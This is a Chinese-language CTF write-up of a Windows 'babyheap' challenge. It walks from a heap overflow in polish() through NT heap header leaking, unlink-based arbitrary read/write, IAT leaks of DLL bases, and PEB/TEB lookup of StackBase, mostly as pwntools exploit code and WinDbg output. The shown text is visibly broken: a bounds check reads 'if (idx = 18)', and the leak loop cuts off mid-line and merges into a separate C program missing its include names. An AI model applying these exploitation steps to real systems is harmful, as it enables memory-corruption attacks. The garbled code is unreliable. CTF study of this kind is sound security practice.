一道很经典的 win pwn ，根据出题人的意思，该题是受`WCTF`的`LazyFragmentationHeap`启发而得来的。
源程序下载： 。
在这里先感谢出题人`m4x`和`WCTF`的一位大佬`Angelboy`的指点。
## babyheap
源码：。
### 漏洞点
程序流比较简单，直接就是`polish`存在堆溢出。
    void polish()
    {
        int idx = -1;
        puts("\nA little change will make a difference.\n");
        puts("Which one will you polish?");
        scanf_wrapper("%d", idx);
        if (idx = 18)
        {
            puts("error");
            return;
        }
        if (g_inuse[idx])
        {
            int size = 0;
            puts("And what's the length this time?");
            scanf_wrapper("%d", size);
            puts("Then name it again : ");
            read_n(g_sword[idx], size); // heap overflow
        }
        else
        {
            puts("It seems that you don't own this sword.");
        }
    }
### leak heap header
Windows 10 使用的是`Nt
heap`，对于使用中的堆块和free的堆块头部都会用`_HEAP->Encoding`进行异或加密，用来防止堆溢出，所以我们要先leak出free的堆块头部加密后的内容，否则我们堆溢出时会被check。
    sh.recvuntil('gift : 0x')
    image_base = int(sh.recvuntil('\r\n'), 16) - 0x001090
    log.info('image_base: ' + hex(image_base))
    for i in range(6):
        add(0x58, '\n')
    destroy(2)
    # leak free heap header
    free_heap_header = ''
    while(len(free_heap_header) 
    #include 
    #include 
    #include 
    char* ptr[0x10];
    int main()
    {
        HANDLE heap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000);
        setbuf(stdout, NULL);
        ptr[0] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
        ptr[1] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
        ptr[2] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
        ptr[3] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
        ptr[4] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
        ptr[5] = (char*)HeapAlloc(heap, HEAP_NO_SERIALIZE, 0x18);
        HeapFree(heap, HEAP_NO_SERIALIZE, ptr[2]);
        HeapFree(heap, HEAP_NO_SERIALIZE, ptr[4]);
        *(void**)(ptr[2]) = &ptr[2] - 1;
        *(void**)(ptr[2] + 4) = &ptr[2];
        printf("%p: %p\n", &ptr[2], ptr[2]);
        HeapFree(heap, HEAP_NO_SERIALIZE, ptr[1]);
        printf("%p: %p\n", &ptr[2], ptr[2]);
        return 0;
    }
其作用就是让`ptr[2]`指针指向自己，这个和Linux有点像。
    destroy(4)
    polish(1, 0x58 + 8 + 8, 'b' * 0x58 + free_heap_header + p32(ptr_addr + 4) + p32(ptr_addr + 8) + '\n')
    destroy(1)
然后再用后门功能使得`unlink`后的指针可以进行编辑。
    sh.sendlineafter('choice?\r\n', '1337')
    sh.sendlineafter('target?\r\n', str(g_inuse_addr + 2))
    polish(2, 4, p32(ptr_addr + 12) + '\n')
完成这些操作后，我们就能利用`index_2`来操作`index_3`指针的指向，实现任意地址读写。
### 泄露地址信息
这个和Linux 差不多，只不过Linux 是 got 表，而 Windows 是 iat
表。至于iat具体在哪个dll动态库里面，这个可以用IDA或者PE工具来查看。
其查询结果如下所示：
    .idata:00403000 ; Imports from KERNEL32.dll
    .idata:00403000 ;
    .idata:00403000 ; ===========================================================================
    .idata:00403000
    .idata:00403000 ; Segment type: Externs
    .idata:00403000 ; _idata
    .idata:00403000 ; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
    .idata:00403000                 extrn HeapCreate:dword  ; CODE XREF: .text:0040111A↑p
我们会在后面需要`ntdll`的地址，而`ntdll`并不在`babyheap`的导入表中，所以我们需要从`KERNEL32`中进行泄露。
    # leak dll base addr
    puts_iat = image_base + 0x0030C8 # ucrtbase.dll
    Sleep_iat = image_base + 0x003008 # KERNEL32.dll
    polish(2, 4, p32(puts_iat) + '\n')
    check(3)
    sh.recvuntil('Show : ')
    result = sh.recvuntil('\r\n', drop=True)[:4]
    ucrtbase_addr = u32(result) - 0xb89b0
    log.success('ucrtbase_addr: ' + hex(ucrtbase_addr))
    polish(2, 4, p32(Sleep_iat) + '\n')
    check(3)
    sh.recvuntil('Show : ')
    result = sh.recvuntil('\r\n', drop=True)[:4]
    KERNEL32_addr = u32(result) - 0x00021ab0
    log.success('KERNEL32_addr: ' + hex(KERNEL32_addr))
    NtCreateFile_iat = KERNEL32_addr + 0x000819bc
    polish(2, 4, p32(NtCreateFile_iat) + '\n')
    check(3)
    sh.recvuntil('Show : ')
    result = sh.recvuntil('\r\n', drop=True)[:4]
    ntdll_addr = u32(result) - 0x709f0
    log.success('ntdll_addr: ' + hex(ntdll_addr))
### 查询peb和teb，泄露StackBase
当我么拥有了任意读写能力，该怎么控制程序流呢？
由于 Windows 的 Nt heap 似乎并没有 hook
之类的，所以我们只能利用传统的栈溢出来控制程序流，但是我们该如何获知栈地址呢，根据`Angelboy`师傅的提示，TEB中会储存栈基地址。
如下所示：
    0:000> !teb
    TEB at 00ffa000
        ExceptionList:        010ff99c
        StackBase:            01100000
        StackLimit:           010fd000
        SubSystemTib:         00000000
        FiberData:            00001e00
        ArbitraryUserPointer: 00000000
        Self:                 00ffa000
        EnvironmentPointer:   00000000
        ClientId:             000013b0 . 00002218
        RpcHandle:            00000000
        Tls Storage:          00ffa02c
        PEB Address:          00ff7000
        LastErrorValue:       0
        LastStatusValue:      0
        Count Owned Locks:    0
        HardErrorMode:        0
对于 Windows
的程序来说，每个进程都有一个`PEB`，每个线程都有一个`TEB`，而且他们的相对偏移一般是固定的。那么我们只要知道`PEB`的地址，就可以计算出`TEB`的地址，从而泄露`StackBase`。
但是`PEB`的地址又该怎么查询呢，在`ntdll!PebLdr`附近，有一个值可以泄露出`PEB`的地址，其调试结果如下：
    0:000> r $peb
    $peb=00ff7000
    0:000> dd ntdll!PebLdr
    76f90c40  00000030 00000001 00000000 01352be8
    76f90c50  01353c38 01352bf0 01353c40 01352b10
    76f90c60  01353c48 00000000 00000000 00000000
    76f90c70  00000002 00000000 00000000 00000000
    76f90c80  00000000 00000000 00000000 00000000
    76f90c90  00000000 00000000 00000000 00000000
    76f90ca0  00000000 00000000 00000000 00000000
    76f90cb0  00000000 00000000 00000000 00000000
    0:000> dd 76f90c00
    76f90c00  00000000 00000000 00000080 00ff721c
    76f90c10  00000000 01352b00 76e70000 00000000
    76f90c20  01350000 00000000 00000000 00000000
    76f90c30  00000000 00000000 00000000 00000000
    76f90c40  00000030 00000001 00000000 01352be8
    76f90c50  01353c38 01352bf0 01353c40 01352b10
    76f90c60  01353c48 00000000 00000000 00000000
    76f90c70  00000002 00000000 00000000 00000000
从上面可以看到`ntdll!PebLdr`向上偏移`52`字节的地方存储着`PEB`地址的信息，而且这个地址信息和`PEB`地址的偏移总是`0x21c`，所以我们可以利用该地址信息来计算出`PEB`的地址。
    ntdll_PedLdr_addr = ntdll_addr + 0x120c40
    log.success('ntdll_PedLdr_addr: ' + hex(ntdll_PedLdr_addr))
    polish(2, 4, p32(ntdll_PedLdr_addr - 52) + '\n')
    check(3)
    sh.recvuntil('Show : ')
    result = sh.recvuntil('\r\n', drop=True)[:4]
    Peb_addr = u32(result.ljust(4, '\0')) - 0x21c
    log.success('Peb_addr: ' + hex(Peb_addr))
又因为`PEB`和`TEB`的地址的偏移是固定的，我们可以计算出`babyheap`线程的`TEB`的地址然后泄露出该线程的栈基地址。
其偏移结果如下：
    0:000> r $peb
    $peb=00ff7000
    0:000> r $teb
    $teb=00ffa000
查看之前，要先把线程调成`babyheap`的，通过查看计算出他们的偏移是`0x3000`。
对应的脚本如下：
    # leak StackBase
    babyheap_Teb_addr = Peb_addr + 0x3000
    log.success('babyheap_Teb_addr: ' + hex(babyheap_Teb_addr))
    result = ''
    while(len(result) < 4):
        result_length = len(result)
        polish(2, 4, p32(babyheap_Teb_addr + 4 + result_length) + '\n')
        check(3)
        sh.recvuntil('Show : ')
        result += sh.recvuntil('\r\n', drop=True) + '\0'
    StackBase = u32(result[:4])
    log.success('StackBase: ' + hex(StackBase))
### 寻找main_ret_addr
我们虽然知道了`StackBase`，但是由于受到`ASLR`影响，main函数的返回地址对于`StackBase`来说并不是固定偏移的，这点和`Linux`是一样的，那么我们该怎么查找`main_ret_addr`的返回地址呢？
由于程序的地址信息我们都已经泄露出来了，所以我们根据偏移是可以计算出`main_ret_addr`这个地址里储存的内容的，而且我们原本就有任意地址读的能力，那么我们可以直接读取栈，直到找到`main_ret_addr`这个地址里储存的内容，这样我们便可以确定其就是`main_ret_addr`。